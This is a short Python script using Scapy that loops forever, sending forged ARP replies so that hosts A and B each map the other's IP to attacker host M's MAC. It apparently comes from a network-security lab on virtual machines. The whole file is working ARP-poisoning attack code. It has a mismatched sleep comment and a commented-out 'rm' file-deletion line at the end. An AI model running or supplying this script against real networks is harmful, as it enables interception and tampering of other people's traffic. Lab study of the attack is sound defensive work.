#!/usr/bin/python3
from scapy.all import *
import time

# Define IP and MAC addresses
A_IP = "10.0.2.5"  # Host A's IP
B_IP = "10.0.2.6"  # Host B's IP
M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC
VM_A_MAC = "08:00:27:80:28:bc"
VM_B_MAC = "08:00:27:05:41:63"
def poison_arp_cache():
    while True:
        # Poison Host A's ARP cache (B_IP -> M_MAC)
        sendp(Ether(dst=VM_A_MAC) / ARP(op=2, psrc=B_IP, hwsrc=M_MAC, pdst=A_IP))

        # Poison Host B's ARP cache (A_IP -> M_MAC)
        sendp(Ether(dst=VM_B_MAC) / ARP(op=2, psrc=A_IP, hwsrc=M_MAC, pdst=B_IP))


        # Wait for 10 seconds before sending again
        time.sleep(30)

poison_arp_cache()
#commande = "rm delete_me"
